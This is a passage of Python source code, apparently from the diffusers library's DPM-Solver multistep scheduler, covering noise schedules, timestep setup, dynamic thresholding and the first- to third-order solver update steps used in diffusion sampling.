{self.__class__}\")\r\n\r\n        if rescale_betas_zero_snr:\r\n            self.betas = rescale_zero_terminal_snr(self.betas)\r\n\r\n        self.alphas = 1.0 - self.betas\r\n        self.alphas_cumprod = torch.cumprod(self.alphas, dim=0)\r\n\r\n        if rescale_betas_zero_snr:\r\n            # Close to 0 without being 0 so first sigma is not inf\r\n            # FP16 smallest positive subnormal works well here\r\n            self.alphas_cumprod[-1] = 2**-24\r\n\r\n        # Currently we only support VP-type noise schedule\r\n        self.alpha_t = torch.sqrt(self.alphas_cumprod)\r\n        self.sigma_t = torch.sqrt(1 - self.alphas_cumprod)\r\n        self.lambda_t = torch.log(self.alpha_t) - torch.log(self.sigma_t)\r\n        self.sigmas = ((1 - self.alphas_cumprod) / self.alphas_cumprod) ** 0.5\r\n\r\n        # standard deviation of the initial noise distribution\r\n        self.init_noise_sigma = 1.0\r\n\r\n        # settings for DPM-Solver\r\n        if algorithm_type not in [\"dpmsolver\", \"dpmsolver++\", \"sde-dpmsolver\", \"sde-dpmsolver++\"]:\r\n            if algorithm_type == \"deis\":\r\n                self.register_to_config(algorithm_type=\"dpmsolver++\")\r\n            else:\r\n                raise NotImplementedError(f\"{algorithm_type} is not implemented for {self.__class__}\")\r\n\r\n        if solver_type not in [\"midpoint\", \"heun\"]:\r\n            if solver_type in [\"logrho\", \"bh1\", \"bh2\"]:\r\n                self.register_to_config(solver_type=\"midpoint\")\r\n            else:\r\n                raise NotImplementedError(f\"{solver_type} is not implemented for {self.__class__}\")\r\n\r\n        if algorithm_type not in [\"dpmsolver++\", \"sde-dpmsolver++\"] and final_sigmas_type == \"zero\":\r\n            raise ValueError(\r\n                f\"`final_sigmas_type` {final_sigmas_type} is not supported for `algorithm_type` {algorithm_type}. Please choose `sigma_min` instead.\"\r\n            )\r\n\r\n        # setable values\r\n        self.num_inference_steps = None\r\n        timesteps = np.linspace(0, num_train_timesteps - 1, num_train_timesteps, dtype=np.float32)[::-1].copy()\r\n        self.timesteps = torch.from_numpy(timesteps)\r\n        self.model_outputs = [None] * solver_order\r\n        self.lower_order_nums = 0\r\n        self._step_index = None\r\n        self._begin_index = None\r\n        self.sigmas = self.sigmas.to(\"cpu\")  # to avoid too much CPU/GPU communication\r\n\r\n    @property\r\n    def step_index(self):\r\n        \"\"\"\r\n        The index counter for current timestep. It will increase 1 after each scheduler step.\r\n        \"\"\"\r\n        return self._step_index\r\n\r\n    @property\r\n    def begin_index(self):\r\n        \"\"\"\r\n        The index for the first timestep. It should be set from pipeline with `set_begin_index` method.\r\n        \"\"\"\r\n        return self._begin_index\r\n\r\n    def set_begin_index(self, begin_index: int = 0):\r\n        \"\"\"\r\n        Sets the begin index for the scheduler. This function should be run from pipeline before the inference.\r\n\r\n        Args:\r\n            begin_index (`int`):\r\n                The begin index for the scheduler.\r\n        \"\"\"\r\n        self._begin_index = begin_index\r\n\r\n    def set_timesteps(\r\n        self,\r\n        num_inference_steps: int = None,\r\n        device: Union[str, torch.device] = None,\r\n        timesteps: Optional[List[int]] = None,\r\n    ):\r\n        \"\"\"\r\n        Sets the discrete timesteps used for the diffusion chain (to be run before inference).\r\n\r\n        Args:\r\n            num_inference_steps (`int`):\r\n                The number of diffusion steps used when generating samples with a pre-trained model.\r\n            device (`str` or `torch.device`, *optional*):\r\n                The device to which the timesteps should be moved to. If `None`, the timesteps are not moved.\r\n            timesteps (`List[int]`, *optional*):\r\n                Custom timesteps used to support arbitrary timesteps schedule. If `None`, timesteps will be generated\r\n                based on the `timestep_spacing` attribute. If `timesteps` is passed, `num_inference_steps` and `sigmas`\r\n                must be `None`, and `timestep_spacing` attribute will be ignored.\r\n        \"\"\"\r\n        if num_inference_steps is None and timesteps is None:\r\n            raise ValueError(\"Must pass exactly one of `num_inference_steps` or `timesteps`.\")\r\n        if num_inference_steps is not None and timesteps is not None:\r\n            raise ValueError(\"Can only pass one of `num_inference_steps` or `custom_timesteps`.\")\r\n        if timesteps is not None and self.config.use_karras_sigmas:\r\n            raise ValueError(\"Cannot use `timesteps` with `config.use_karras_sigmas = True`\")\r\n        if timesteps is not None and self.config.use_lu_lambdas:\r\n            raise ValueError(\"Cannot use `timesteps` with `config.use_lu_lambdas = True`\")\r\n\r\n        if timesteps is not None:\r\n            timesteps = np.array(timesteps).astype(np.int64)\r\n        else:\r\n            # Clipping the minimum of all lambda(t) for numerical stability.\r\n            # This is critical for cosine (squaredcos_cap_v2) noise schedule.\r\n            clipped_idx = torch.searchsorted(torch.flip(self.lambda_t, [0]), self.config.lambda_min_clipped)\r\n            last_timestep = ((self.config.num_train_timesteps - clipped_idx).numpy()).item()\r\n\r\n            # \"linspace\", \"leading\", \"trailing\" corresponds to annotation of Table 2. of https://arxiv.org/abs/2305.08891\r\n            if self.config.timestep_spacing == \"linspace\":\r\n                timesteps = (\r\n                    np.linspace(0, last_timestep - 1, num_inference_steps + 1)\r\n                    .round()[::-1][:-1]\r\n                    .copy()\r\n                    .astype(np.int64)\r\n                )\r\n            elif self.config.timestep_spacing == \"leading\":\r\n                step_ratio = last_timestep // (num_inference_steps + 1)\r\n                # creates integer timesteps by multiplying by ratio\r\n                # casting to int to avoid issues when num_inference_step is power of 3\r\n                timesteps = (\r\n                    (np.arange(0, num_inference_steps + 1) * step_ratio).round()[::-1][:-1].copy().astype(np.int64)\r\n                )\r\n                timesteps += self.config.steps_offset\r\n            elif self.config.timestep_spacing == \"trailing\":\r\n                step_ratio = self.config.num_train_timesteps / num_inference_steps\r\n                # creates integer timesteps by multiplying by ratio\r\n                # casting to int to avoid issues when num_inference_step is power of 3\r\n                timesteps = np.arange(last_timestep, 0, -step_ratio).round().copy().astype(np.int64)\r\n                timesteps -= 1\r\n            else:\r\n                raise ValueError(\r\n                    f\"{self.config.timestep_spacing} is not supported. Please make sure to choose one of 'linspace', 'leading' or 'trailing'.\"\r\n                )\r\n\r\n        sigmas = np.array(((1 - self.alphas_cumprod) / self.alphas_cumprod) ** 0.5)\r\n        log_sigmas = np.log(sigmas)\r\n\r\n        if self.config.use_karras_sigmas:\r\n            sigmas = np.flip(sigmas).copy()\r\n            sigmas = self._convert_to_karras(in_sigmas=sigmas, num_inference_steps=num_inference_steps)\r\n            timesteps = np.array([self._sigma_to_t(sigma, log_sigmas) for sigma in sigmas]).round()\r\n        elif self.config.use_lu_lambdas:\r\n            lambdas = np.flip(log_sigmas.copy())\r\n            lambdas = self._convert_to_lu(in_lambdas=lambdas, num_inference_steps=num_inference_steps)\r\n            sigmas = np.exp(lambdas)\r\n            timesteps = np.array([self._sigma_to_t(sigma, log_sigmas) for sigma in sigmas]).round()\r\n        else:\r\n            sigmas = np.interp(timesteps, np.arange(0, len(sigmas)), sigmas)\r\n\r\n        if self.config.final_sigmas_type == \"sigma_min\":\r\n            sigma_last = ((1 - self.alphas_cumprod[0]) / self.alphas_cumprod[0]) ** 0.5\r\n        elif self.config.final_sigmas_type == \"zero\":\r\n            sigma_last = 0\r\n        else:\r\n            raise ValueError(\r\n                f\"`final_sigmas_type` must be one of 'zero', or 'sigma_min', but got {self.config.final_sigmas_type}\"\r\n            )\r\n\r\n        sigmas = np.concatenate([sigmas, [sigma_last]]).astype(np.float32)\r\n\r\n        self.sigmas = torch.from_numpy(sigmas)\r\n        self.timesteps = torch.from_numpy(timesteps).to(device=device, dtype=torch.int64)\r\n\r\n        self.num_inference_steps = len(timesteps)\r\n\r\n        self.model_outputs = [\r\n            None,\r\n        ] * self.config.solver_order\r\n        self.lower_order_nums = 0\r\n\r\n        # add an index counter for schedulers that allow duplicated timesteps\r\n        self._step_index = None\r\n        self._begin_index = None\r\n        self.sigmas = self.sigmas.to(\"cpu\")  # to avoid too much CPU/GPU communication\r\n\r\n    # Copied from diffusers.schedulers.scheduling_ddpm.DDPMScheduler._threshold_sample\r\n    def _threshold_sample(self, sample: torch.Tensor) -> torch.Tensor:\r\n        \"\"\"\r\n        \"Dynamic thresholding: At each sampling step we set s to a certain percentile absolute pixel value in xt0 (the\r\n        prediction of x_0 at timestep t), and if s > 1, then we threshold xt0 to the range [-s, s] and then divide by\r\n        s. Dynamic thresholding pushes saturated pixels (those near -1 and 1) inwards, thereby actively preventing\r\n        pixels from saturation at each step. We find that dynamic thresholding results in significantly better\r\n        photorealism as well as better image-text alignment, especially when using very large guidance weights.\"\r\n\r\n        https://arxiv.org/abs/2205.11487\r\n        \"\"\"\r\n        dtype = sample.dtype\r\n        batch_size, channels, *remaining_dims = sample.shape\r\n\r\n        if dtype not in (torch.float32, torch.float64):\r\n            sample = sample.float()  # upcast for quantile calculation, and clamp not implemented for cpu half\r\n\r\n        # Flatten sample for doing quantile calculation along each image\r\n        sample = sample.reshape(batch_size, channels * np.prod(remaining_dims))\r\n\r\n        abs_sample = sample.abs()  # \"a certain percentile absolute pixel value\"\r\n\r\n        s = torch.quantile(abs_sample, self.config.dynamic_thresholding_ratio, dim=1)\r\n        s = torch.clamp(\r\n            s, min=1, max=self.config.sample_max_value\r\n        )  # When clamped to min=1, equivalent to standard clipping to [-1, 1]\r\n        s = s.unsqueeze(1)  # (batch_size, 1) because clamp will broadcast along dim=0\r\n        sample = torch.clamp(sample, -s, s) / s  # \"we threshold xt0 to the range [-s, s] and then divide by s\"\r\n\r\n        sample = sample.reshape(batch_size, channels, *remaining_dims)\r\n        sample = sample.to(dtype)\r\n\r\n        return sample\r\n\r\n    # Copied from diffusers.schedulers.scheduling_euler_discrete.EulerDiscreteScheduler._sigma_to_t\r\n    def _sigma_to_t(self, sigma, log_sigmas):\r\n        # get log sigma\r\n        log_sigma = np.log(np.maximum(sigma, 1e-10))\r\n\r\n        # get distribution\r\n        dists = log_sigma - log_sigmas[:, np.newaxis]\r\n\r\n        # get sigmas range\r\n        low_idx = np.cumsum((dists >= 0), axis=0).argmax(axis=0).clip(max=log_sigmas.shape[0] - 2)\r\n        high_idx = low_idx + 1\r\n\r\n        low = log_sigmas[low_idx]\r\n        high = log_sigmas[high_idx]\r\n\r\n        # interpolate sigmas\r\n        w = (low - log_sigma) / (low - high)\r\n        w = np.clip(w, 0, 1)\r\n\r\n        # transform interpolation to time range\r\n        t = (1 - w) * low_idx + w * high_idx\r\n        t = t.reshape(sigma.shape)\r\n        return t\r\n\r\n    def _sigma_to_alpha_sigma_t(self, sigma):\r\n        alpha_t = 1 / ((sigma**2 + 1) ** 0.5)\r\n        sigma_t = sigma * alpha_t\r\n\r\n        return alpha_t, sigma_t\r\n\r\n    # Copied from diffusers.schedulers.scheduling_euler_discrete.EulerDiscreteScheduler._convert_to_karras\r\n    def _convert_to_karras(self, in_sigmas: torch.Tensor, num_inference_steps) -> torch.Tensor:\r\n        \"\"\"Constructs the noise schedule of Karras et al. (2022).\"\"\"\r\n\r\n        # Hack to make sure that other schedulers which copy this function don't break\r\n        # TODO: Add this logic to the other schedulers\r\n        if hasattr(self.config, \"sigma_min\"):\r\n            sigma_min = self.config.sigma_min\r\n        else:\r\n            sigma_min = None\r\n\r\n        if hasattr(self.config, \"sigma_max\"):\r\n            sigma_max = self.config.sigma_max\r\n        else:\r\n            sigma_max = None\r\n\r\n        sigma_min = sigma_min if sigma_min is not None else in_sigmas[-1].item()\r\n        sigma_max = sigma_max if sigma_max is not None else in_sigmas[0].item()\r\n\r\n        rho = 7.0  # 7.0 is the value used in the paper\r\n        ramp = np.linspace(0, 1, num_inference_steps)\r\n        min_inv_rho = sigma_min ** (1 / rho)\r\n        max_inv_rho = sigma_max ** (1 / rho)\r\n        sigmas = (max_inv_rho + ramp * (min_inv_rho - max_inv_rho)) ** rho\r\n        return sigmas\r\n\r\n    def _convert_to_lu(self, in_lambdas: torch.Tensor, num_inference_steps) -> torch.Tensor:\r\n        \"\"\"Constructs the noise schedule of Lu et al. (2022).\"\"\"\r\n\r\n        lambda_min: float = in_lambdas[-1].item()\r\n        lambda_max: float = in_lambdas[0].item()\r\n\r\n        rho = 1.0  # 1.0 is the value used in the paper\r\n        ramp = np.linspace(0, 1, num_inference_steps)\r\n        min_inv_rho = lambda_min ** (1 / rho)\r\n        max_inv_rho = lambda_max ** (1 / rho)\r\n        lambdas = (max_inv_rho + ramp * (min_inv_rho - max_inv_rho)) ** rho\r\n        return lambdas\r\n\r\n    def convert_model_output(\r\n        self,\r\n        model_output: torch.Tensor,\r\n        *args,\r\n        sample: torch.Tensor = None,\r\n        **kwargs,\r\n    ) -> torch.Tensor:\r\n        \"\"\"\r\n        Convert the model output to the corresponding type the DPMSolver/DPMSolver++ algorithm needs. DPM-Solver is\r\n        designed to discretize an integral of the noise prediction model, and DPM-Solver++ is designed to discretize an\r\n        integral of the data prediction model.\r\n\r\n        <Tip>\r\n\r\n        The algorithm and model type are decoupled. You can use either DPMSolver or DPMSolver++ for both noise\r\n        prediction and data prediction models.\r\n\r\n        </Tip>\r\n\r\n        Args:\r\n            model_output (`torch.Tensor`):\r\n                The direct output from the learned diffusion model.\r\n            sample (`torch.Tensor`):\r\n                A current instance of a sample created by the diffusion process.\r\n\r\n        Returns:\r\n            `torch.Tensor`:\r\n                The converted model output.\r\n        \"\"\"\r\n        timestep = args[0] if len(args) > 0 else kwargs.pop(\"timestep\", None)\r\n        if sample is None:\r\n            if len(args) > 1:\r\n                sample = args[1]\r\n            else:\r\n                raise ValueError(\"missing `sample` as a required keyward argument\")\r\n        if timestep is not None:\r\n            deprecate(\r\n                \"timesteps\",\r\n                \"1.0.0\",\r\n                \"Passing `timesteps` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        # DPM-Solver++ needs to solve an integral of the data prediction model.\r\n        if self.config.algorithm_type in [\"dpmsolver++\", \"sde-dpmsolver++\"]:\r\n            if self.config.prediction_type == \"epsilon\":\r\n                # DPM-Solver and DPM-Solver++ only need the \"mean\" output.\r\n                if self.config.variance_type in [\"learned\", \"learned_range\"]:\r\n                    model_output = model_output[:, :3]\r\n                sigma = self.sigmas[self.step_index]\r\n                alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma)\r\n                x0_pred = (sample - sigma_t * model_output) / alpha_t\r\n            elif self.config.prediction_type == \"sample\":\r\n                x0_pred = model_output\r\n            elif self.config.prediction_type == \"v_prediction\":\r\n                sigma = self.sigmas[self.step_index]\r\n                alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma)\r\n                x0_pred = alpha_t * sample - sigma_t * model_output\r\n            else:\r\n                raise ValueError(\r\n                    f\"prediction_type given as {self.config.prediction_type} must be one of `epsilon`, `sample`, or\"\r\n                    \" `v_prediction` for the DPMSolverMultistepScheduler.\"\r\n                )\r\n\r\n            if self.config.thresholding:\r\n                x0_pred = self._threshold_sample(x0_pred)\r\n\r\n            return x0_pred\r\n\r\n        # DPM-Solver needs to solve an integral of the noise prediction model.\r\n        elif self.config.algorithm_type in [\"dpmsolver\", \"sde-dpmsolver\"]:\r\n            if self.config.prediction_type == \"epsilon\":\r\n                # DPM-Solver and DPM-Solver++ only need the \"mean\" output.\r\n                if self.config.variance_type in [\"learned\", \"learned_range\"]:\r\n                    epsilon = model_output[:, :3]\r\n                else:\r\n                    epsilon = model_output\r\n            elif self.config.prediction_type == \"sample\":\r\n                sigma = self.sigmas[self.step_index]\r\n                alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma)\r\n                epsilon = (sample - alpha_t * model_output) / sigma_t\r\n            elif self.config.prediction_type == \"v_prediction\":\r\n                sigma = self.sigmas[self.step_index]\r\n                alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma)\r\n                epsilon = alpha_t * model_output + sigma_t * sample\r\n            else:\r\n                raise ValueError(\r\n                    f\"prediction_type given as {self.config.prediction_type} must be one of `epsilon`, `sample`, or\"\r\n                    \" `v_prediction` for the DPMSolverMultistepScheduler.\"\r\n                )\r\n\r\n            if self.config.thresholding:\r\n                sigma = self.sigmas[self.step_index]\r\n                alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma)\r\n                x0_pred = (sample - sigma_t * epsilon) / alpha_t\r\n                x0_pred = self._threshold_sample(x0_pred)\r\n                epsilon = (sample - alpha_t * x0_pred) / sigma_t\r\n\r\n            return epsilon\r\n\r\n    def dpm_solver_first_order_update(\r\n        self,\r\n        model_output: torch.Tensor,\r\n        *args,\r\n        sample: torch.Tensor = None,\r\n        noise: Optional[torch.Tensor] = None,\r\n        **kwargs,\r\n    ) -> torch.Tensor:\r\n        \"\"\"\r\n        One step for the first-order DPMSolver (equivalent to DDIM).\r\n\r\n        Args:\r\n            model_output (`torch.Tensor`):\r\n                The direct output from the learned diffusion model.\r\n            sample (`torch.Tensor`):\r\n                A current instance of a sample created by the diffusion process.\r\n\r\n        Returns:\r\n            `torch.Tensor`:\r\n                The sample tensor at the previous timestep.\r\n        \"\"\"\r\n        timestep = args[0] if len(args) > 0 else kwargs.pop(\"timestep\", None)\r\n        prev_timestep = args[1] if len(args) > 1 else kwargs.pop(\"prev_timestep\", None)\r\n        if sample is None:\r\n            if len(args) > 2:\r\n                sample = args[2]\r\n            else:\r\n                raise ValueError(\" missing `sample` as a required keyward argument\")\r\n        if timestep is not None:\r\n            deprecate(\r\n                \"timesteps\",\r\n                \"1.0.0\",\r\n                \"Passing `timesteps` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        if prev_timestep is not None:\r\n            deprecate(\r\n                \"prev_timestep\",\r\n                \"1.0.0\",\r\n                \"Passing `prev_timestep` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        sigma_t, sigma_s = self.sigmas[self.step_index + 1], self.sigmas[self.step_index]\r\n        alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma_t)\r\n        alpha_s, sigma_s = self._sigma_to_alpha_sigma_t(sigma_s)\r\n        lambda_t = torch.log(alpha_t) - torch.log(sigma_t)\r\n        lambda_s = torch.log(alpha_s) - torch.log(sigma_s)\r\n\r\n        h = lambda_t - lambda_s\r\n        if self.config.algorithm_type == \"dpmsolver++\":\r\n            x_t = (sigma_t / sigma_s) * sample - (alpha_t * (torch.exp(-h) - 1.0)) * model_output\r\n        elif self.config.algorithm_type == \"dpmsolver\":\r\n            x_t = (alpha_t / alpha_s) * sample - (sigma_t * (torch.exp(h) - 1.0)) * model_output\r\n        elif self.config.algorithm_type == \"sde-dpmsolver++\":\r\n            assert noise is not None\r\n            x_t = (\r\n                (sigma_t / sigma_s * torch.exp(-h)) * sample\r\n                + (alpha_t * (1 - torch.exp(-2.0 * h))) * model_output\r\n                + sigma_t * torch.sqrt(1.0 - torch.exp(-2 * h)) * noise\r\n            )\r\n        elif self.config.algorithm_type == \"sde-dpmsolver\":\r\n            assert noise is not None\r\n            x_t = (\r\n                (alpha_t / alpha_s) * sample\r\n                - 2.0 * (sigma_t * (torch.exp(h) - 1.0)) * model_output\r\n                + sigma_t * torch.sqrt(torch.exp(2 * h) - 1.0) * noise\r\n            )\r\n        return x_t\r\n\r\n    def multistep_dpm_solver_second_order_update(\r\n        self,\r\n        model_output_list: List[torch.Tensor],\r\n        *args,\r\n        sample: torch.Tensor = None,\r\n        noise: Optional[torch.Tensor] = None,\r\n        **kwargs,\r\n    ) -> torch.Tensor:\r\n        \"\"\"\r\n        One step for the second-order multistep DPMSolver.\r\n\r\n        Args:\r\n            model_output_list (`List[torch.Tensor]`):\r\n                The direct outputs from learned diffusion model at current and latter timesteps.\r\n            sample (`torch.Tensor`):\r\n                A current instance of a sample created by the diffusion process.\r\n\r\n        Returns:\r\n            `torch.Tensor`:\r\n                The sample tensor at the previous timestep.\r\n        \"\"\"\r\n        timestep_list = args[0] if len(args) > 0 else kwargs.pop(\"timestep_list\", None)\r\n        prev_timestep = args[1] if len(args) > 1 else kwargs.pop(\"prev_timestep\", None)\r\n        if sample is None:\r\n            if len(args) > 2:\r\n                sample = args[2]\r\n            else:\r\n                raise ValueError(\" missing `sample` as a required keyward argument\")\r\n        if timestep_list is not None:\r\n            deprecate(\r\n                \"timestep_list\",\r\n                \"1.0.0\",\r\n                \"Passing `timestep_list` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        if prev_timestep is not None:\r\n            deprecate(\r\n                \"prev_timestep\",\r\n                \"1.0.0\",\r\n                \"Passing `prev_timestep` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        sigma_t, sigma_s0, sigma_s1 = (\r\n            self.sigmas[self.step_index + 1],\r\n            self.sigmas[self.step_index],\r\n            self.sigmas[self.step_index - 1],\r\n        )\r\n\r\n        alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma_t)\r\n        alpha_s0, sigma_s0 = self._sigma_to_alpha_sigma_t(sigma_s0)\r\n        alpha_s1, sigma_s1 = self._sigma_to_alpha_sigma_t(sigma_s1)\r\n\r\n        lambda_t = torch.log(alpha_t) - torch.log(sigma_t)\r\n        lambda_s0 = torch.log(alpha_s0) - torch.log(sigma_s0)\r\n        lambda_s1 = torch.log(alpha_s1) - torch.log(sigma_s1)\r\n\r\n        m0, m1 = model_output_list[-1], model_output_list[-2]\r\n\r\n        h, h_0 = lambda_t - lambda_s0, lambda_s0 - lambda_s1\r\n        r0 = h_0 / h\r\n        D0, D1 = m0, (1.0 / r0) * (m0 - m1)\r\n        if self.config.algorithm_type == \"dpmsolver++\":\r\n            # See https://arxiv.org/abs/2211.01095 for detailed derivations\r\n            if self.config.solver_type == \"midpoint\":\r\n                x_t = (\r\n                    (sigma_t / sigma_s0) * sample\r\n                    - (alpha_t * (torch.exp(-h) - 1.0)) * D0\r\n                    - 0.5 * (alpha_t * (torch.exp(-h) - 1.0)) * D1\r\n                )\r\n            elif self.config.solver_type == \"heun\":\r\n                x_t = (\r\n                    (sigma_t / sigma_s0) * sample\r\n                    - (alpha_t * (torch.exp(-h) - 1.0)) * D0\r\n                    + (alpha_t * ((torch.exp(-h) - 1.0) / h + 1.0)) * D1\r\n                )\r\n        elif self.config.algorithm_type == \"dpmsolver\":\r\n            # See https://arxiv.org/abs/2206.00927 for detailed derivations\r\n            if self.config.solver_type == \"midpoint\":\r\n                x_t = (\r\n                    (alpha_t / alpha_s0) * sample\r\n                    - (sigma_t * (torch.exp(h) - 1.0)) * D0\r\n                    - 0.5 * (sigma_t * (torch.exp(h) - 1.0)) * D1\r\n                )\r\n            elif self.config.solver_type == \"heun\":\r\n                x_t = (\r\n                    (alpha_t / alpha_s0) * sample\r\n                    - (sigma_t * (torch.exp(h) - 1.0)) * D0\r\n                    - (sigma_t * ((torch.exp(h) - 1.0) / h - 1.0)) * D1\r\n                )\r\n        elif self.config.algorithm_type == \"sde-dpmsolver++\":\r\n            assert noise is not None\r\n            if self.config.solver_type == \"midpoint\":\r\n                x_t = (\r\n                    (sigma_t / sigma_s0 * torch.exp(-h)) * sample\r\n                    + (alpha_t * (1 - torch.exp(-2.0 * h))) * D0\r\n                    + 0.5 * (alpha_t * (1 - torch.exp(-2.0 * h))) * D1\r\n                    + sigma_t * torch.sqrt(1.0 - torch.exp(-2 * h)) * noise\r\n                )\r\n            elif self.config.solver_type == \"heun\":\r\n                x_t = (\r\n                    (sigma_t / sigma_s0 * torch.exp(-h)) * sample\r\n                    + (alpha_t * (1 - torch.exp(-2.0 * h))) * D0\r\n                    + (alpha_t * ((1.0 - torch.exp(-2.0 * h)) / (-2.0 * h) + 1.0)) * D1\r\n                    + sigma_t * torch.sqrt(1.0 - torch.exp(-2 * h)) * noise\r\n                )\r\n        elif self.config.algorithm_type == \"sde-dpmsolver\":\r\n            assert noise is not None\r\n            if self.config.solver_type == \"midpoint\":\r\n                x_t = (\r\n                    (alpha_t / alpha_s0) * sample\r\n                    - 2.0 * (sigma_t * (torch.exp(h) - 1.0)) * D0\r\n                    - (sigma_t * (torch.exp(h) - 1.0)) * D1\r\n                    + sigma_t * torch.sqrt(torch.exp(2 * h) - 1.0) * noise\r\n                )\r\n            elif self.config.solver_type == \"heun\":\r\n                x_t = (\r\n                    (alpha_t / alpha_s0) * sample\r\n                    - 2.0 * (sigma_t * (torch.exp(h) - 1.0)) * D0\r\n                    - 2.0 * (sigma_t * ((torch.exp(h) - 1.0) / h - 1.0)) * D1\r\n                    + sigma_t * torch.sqrt(torch.exp(2 * h) - 1.0) * noise\r\n                )\r\n        return x_t\r\n\r\n    def multistep_dpm_solver_third_order_update(\r\n        self,\r\n        model_output_list: List[torch.Tensor],\r\n        *args,\r\n        sample: torch.Tensor = None,\r\n        **kwargs,\r\n    ) -> torch.Tensor:\r\n        \"\"\"\r\n        One step for the third-order multistep DPMSolver.\r\n\r\n        Args:\r\n            model_output_list (`List[torch.Tensor]`):\r\n                The direct outputs from learned diffusion model at current and latter timesteps.\r\n            sample (`torch.Tensor`):\r\n                A current instance of a sample created by diffusion process.\r\n\r\n        Returns:\r\n            `torch.Tensor`:\r\n                The sample tensor at the previous timestep.\r\n        \"\"\"\r\n\r\n        timestep_list = args[0] if len(args) > 0 else kwargs.pop(\"timestep_list\", None)\r\n        prev_timestep = args[1] if len(args) > 1 else kwargs.pop(\"prev_timestep\", None)\r\n        if sample is None:\r\n            if len(args) > 2:\r\n                sample = args[2]\r\n            else:\r\n                raise ValueError(\" missing`sample` as a required keyward argument\")\r\n        if timestep_list is not None:\r\n            deprecate(\r\n                \"timestep_list\",\r\n                \"1.0.0\",\r\n                \"Passing `timestep_list` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        if prev_timestep is not None:\r\n            deprecate(\r\n                \"prev_timestep\",\r\n                \"1.0.0\",\r\n                \"Passing `prev_timestep` is deprecated and has no effect as model output conversion is now handled via an internal counter `self.step_index`\",\r\n            )\r\n\r\n        sigma_t, sigma_s0, sigma_s1, sigma_s2 = (\r\n            self.sigmas[self.step_index + 1],\r\n            self.sigmas[self.step_index],\r\n            self.sigmas[self.step_index - 1],\r\n            self.sigmas[self.step_index - 2],\r\n        )\r\n\r\n        alpha_t, sigma_t = self._sigma_to_alpha_sigma_t(sigma_t)\r\n        alpha_s0, sigma_s0 = self._sigma_to_alpha_sigma_t(sigma_s0)\r\n        alpha_s1, sigma_s1 = self._sigma_to_alpha_sigma_t(sigma_s1)\r\n        alpha_s2, sigma_s2 = self._sigma_to_alpha_sigma_t(sigma_s2)\r\n\r\n        lambda_t = torch.log(alpha_t) - torch.log(sigma_t)\r\n        lambda_s0 = torch.log(alpha_s0) - torch.log(sigma_s0)\r\n        lambda_s1 = torch.log(alpha_s1) - torch.log(sigma_s1)\r\n        lambda_s2 = torch.log(alpha_s2) - torch.log(sigma_s2)\r\n\r\n        m0, m1, m2 = model_output_list[-1], model_output_list[-2], model_output_list[-3]\r\n\r\n        h, h_0, h_1 = lambda_t - lambda_s0, lambda_s0 - lambda_s1, lambda_s1 - lambda_s2\r\n        r0, r1 = h_0 / h, h_1 / h\r\n        D0 = m0\r\n        D1_0, D1_1 = (1.0 / r0) * (m0 - m1), (1.0 / r1) * (m1 - m2)\r\n        D1 = D1_0 + (r0 / (r0 + r1)) * (D1_0 - D1_1)\r\n        D2 = (1.0 / (r0 + r1)) * (D1_0 - D1_1)\r\n        if self.config.algorithm_type == \"dpmsolver++\":\r\n            # See https://arxiv.org/abs/2206.00927 for detailed derivations\r\n            x_t = (\r\n                (sigma_t / sigma_s0) * sample\r\n                - (alpha_t * (torch.exp(-h) - 1.0)) * D0\r\n                + (alpha_t * ((torch.exp(-h) - 1.0) / h + 1.0)) * D1\r\n                - (alpha_t * ((torch.exp(-h) - 1.0 + h) / h**2 - 0.5)) * D2\r\n            )\r\n        elif self.config.algorithm_type == \"dpmsolver\":\r\n            # See https://arxiv.org/abs/2206.00927 for detailed derivations\r\n            x_t = (\r\n                (alpha_t / alpha_s0) * sample\r\n                - (sigma_t * (torch.exp(h) - 1.0)) * D0\r\n                - (sigma_t * ((torch.exp(h) - 1.0) / h - 1.0)) * D1\r\n                - (sigma_t * ((torch.exp(h) - 1.0 - h) / h**2 - 0.5)) * D2\r\n            )\r\n        return x_t\r\n\r\n    def index_for_timestep(self, timestep, schedule_timesteps=None):\r\n        if schedule_timesteps is None:\r\n            schedule_timesteps = self.timesteps\r\n\r\n        index_candidates = (schedule_timesteps == timestep).nonzero()\r\n\r\n        if len(index_candidates) == 0:\r\n            step_index = len(self.timesteps) - 1\r\n        # The sigma index that is taken for the **very** first `step`\r\n        # is always the second index (or the last index if there is only 1)\r\n        # This way we can ensure we don't accidentally skip a sigma in\r\n        # case we start in the middle of the denoising schedule (e.g. for image-to-image)\r\n        elif len(index_candidates) > 1:\r\n            step_index = index_candidates[1].item()\r\n        else:\r\n            step_index = index_candidates[0].item()\r\n\r\n        return step_index\r\n\r\n    def _init_step_index(self, timestep):\r\n        \"\"\"\r\n        Initialize the step_index counter for the scheduler.\r\n        \"\"\"\r\n\r\n        if self.begin_index is None:\r\n            if isinstance(timestep, torch.Tensor):\r\n                timestep = timestep.to(self.timesteps.device)\r\n            self._step_index = self.index_for_timestep(timestep)\r\n        else:\r\n            self._step_index = self._begin_index\r\n\r\n    def step(\r\n        self,\r\n        model_output: torch.Tensor,\r\n        timestep: int,\r\n        sample: torch.Tensor,\r\n        generator=None,\r\n        variance_noise: Optional[torch.Tensor] = None,\r\n        return_dict: bool = True,\r\n    ) -> Union[SchedulerOutput, Tuple]:\r\n        \"\"\"\r\n        Predict the sample from the previous timestep by reversing the SDE. This function propagates the sample with\r\n        the multistep DPMSolver.\r\n\r\n        Args:\r\n            model_output (`torch.Tensor`):\r\n                The direct output from learned diffusion model.\r\n            timestep (`int`):\r\n                The current discrete timestep in the diffusion chain.\r\n            sample (`torch.Tensor`):\r\n                A current instance of a sample created by the diffusion process.\r\n            generator 